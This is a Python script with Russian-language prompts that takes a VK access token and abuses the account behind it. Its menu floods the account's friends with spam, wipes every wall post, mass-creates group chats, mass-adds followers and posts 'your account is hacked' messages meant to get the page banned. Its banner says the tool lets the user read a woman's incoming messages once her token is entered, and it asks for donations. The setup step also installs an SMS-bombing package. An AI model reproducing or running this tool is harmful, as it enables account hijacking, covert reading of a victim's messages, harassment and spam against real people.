from os import system as cmd
def install():
	a=int(input("У тебя Termux, Linux или Windows?\n\n Eсли Termux - пиши 1\n Eсли Linux - 2\n Eсли Windows - 3\n\n[1/2/3]>>"))
	if a == 1:
		cmd("pkg install python")
		cmd("pip install b0mb3r")
		cmd("pip install vk")
		cmd("pip install vk_api")
		cmd("pip install requests")
		cmd("pip install colorama")
		cmd("pip install pytz && pip install datetime")
	elif a == 2:
		cmd("sudo apt-get install python3")
		cmd("pip3 install b0mb3r && pip3 install datetime && pip3 install pytz && pip3 install colorama && pip3 install vk && pip3 install vk_api && pip3 install requests")
	elif a == 3:
		cmd("pip install vk && pip install datetime && pip install pytz && pip install colorama && pip install requests && pip install vk_api && pip install b0mb3r")
	else:
		print("OTMEHA")

if input("Установить библиотеки? [y/n]>>").lower() == "y":
	install()
	cmd("clear")
	cmd("cls")
else:
	cmd("clear")
	cmd("cls")

def main():
	def msk_time():
		#time
		return datetime.datetime.strftime(datetime.datetime.now(pytz.timezone('Europe/Moscow')), "%d.%m.%Y %H:%M:%S")
	def fullban():
		try:
			token = vk_api.VkApi(token = cfg) 
			vk = token.get_api()
			vk.wall.post(message='Твоя жопа взломана!')
			for var in range(5):
				time.sleep(3)
				vk.wall.post(message='vto.pe')
				print(Fore.BLACK + Back.GREEN + "[log] Сообщение отправленно. Ожидайте бана!")
			print(Back.BLACK + Fore.WHITE)
		except Exception as er:
			print('Невалидный токен или страница в бане')

	def spam_friends():
		try: 

			token = vk_api.VkApi(token = cfg) 
			vk = token.get_api()
			mes = input('[Message] ► ')
			nummer = int(input('[Сколько отправлять?] ► '))
			fr = vk.friends.get()['items']
			for m in range(nummer):
				for frr in fr:
					vk.messages.send(user_id=frr, message=mes, random_id=get_random_id())
					print('[log] Сообщение отправленно! vk.com/id' + str(frr))
					time.sleep(2)
					fr = vk.friends.get()['items']
			main()
		except Exception as er:
			print(er)

	def delite_wall():
		try:
			token = vk_api.VkApi(token = cfg) 
			vk = token.get_api()   

			posts = vk.wall.get(count=100)['items']
			while(posts):
				for post in posts:
					print('Успешно удаленно!')
					vk.wall.delete(post_id=post['id'])
				posts = vk.wall.get(count=100)['items']

		except Exception as er:
			print('Неверный токен или неполучилось создать соединение!')

	def chat():
		token = vk_api.VkApi(token = cfg) 
		vk = token.get_api()
		a = vk.friends.get()
		namechat = input('[Название беседы] ► ')
		id = vk.friends.get()['items']
		list = id
		while(id):
			for ids in id:
				print('Беседа создана!')
				vk.messages.createChat(user_ids=list, title=namechat)
				posts = vk.friends.get()['items']
				time.sleep(80)
	def addfr():
		token = vk_api.VkApi(token = cfg) 
		vk = token.get_api()
		fr = vk.users.getFollowers(count=1000, offset=0)['items']
		print(fr)
		maine = []
		while(fr):
			for frr in fr:
				try:
					vk.friends.add(user_id=frr)
					print('[log] Подписчик добавлен! vk.com/id' + str(frr))
					if fr in frr:
						print(frr)
						print(str(maine))
						break
					else:
						maine.append(frr)
				except Exception as er:
					print("Подписчик в бане!")
					break
	def message_get():
		for event in longpoll.listen():
			if event.type == VkEventType.MESSAGE_NEW and event.to_me and event.text:
				try:
					timer=msk_time()
					print(str(timer))
					print('id{}: "{}"'.format(event.user_id, event.text), end=' ')
					print(" ")
					#in file
					timer=msk_time()
					file.write("\n"+str(timer)+"\n")
					file.write("\n")
				except Exception as er:
					print(str(er))
	
	file = open("sms.txt","a")
	session = requests.Session()
	vk = vk_session.get_api()
	longpoll = VkLongPoll(vk_session)
	while True:
		print("\n - Сообщения которые она отправляет - не видно, но видно приходящие ей)))\nскинь мне на киви деняк пжста.... ну хоть руб 400 т_т\nпользуйся на здоровье - просто введи токен и получишь Фул её смс\n\n\n")
		print("ALL COMMAND IN TEST - THIS IS ALPHA\n\n!HELP\n1-addfriends,\n2-create chat group for all your friends,\n3-del post on your wall,\n4-spam for your friends\n5 - ban vk\n6 - vk_api message\n\n\n\n")

		a = input("\n<[=1=2=3=4=5=6=]>")
		if a == "1":
			addfr()
		elif a == "2":
			chat()
		elif a == "3":
			delite_wall()
		elif a == "4":
			spam_friends()
		elif a == "5":
			fullban()
		elif a == "6":
			msg = msk_time()
			msg+=" - vk_api bot2.0 start :)) #R_X #soft #vk #vk_api"
			vk.wall.post(message = msg)
		else:
			print("Сообщения юзера:")
			message_get()
		cmd("clear")
		cmd("cls")



from colorama import Fore, Back, Style 
import requests,random,time,vk_api,datetime,pytz
from vk_api import VkUpload
from vk_api.longpoll import VkLongPoll, VkEventType
from vk_api.utils import get_random_id
if True:
	try:
		cfg = input("[ Enter TOKEN VK ]>> ")
		vk_session = vk_api.VkApi(token=cfg)
		cmd("clear")
		cmd("cls")
		main()
	except vk_api.AuthError as error_msg:
		print(error_msg)
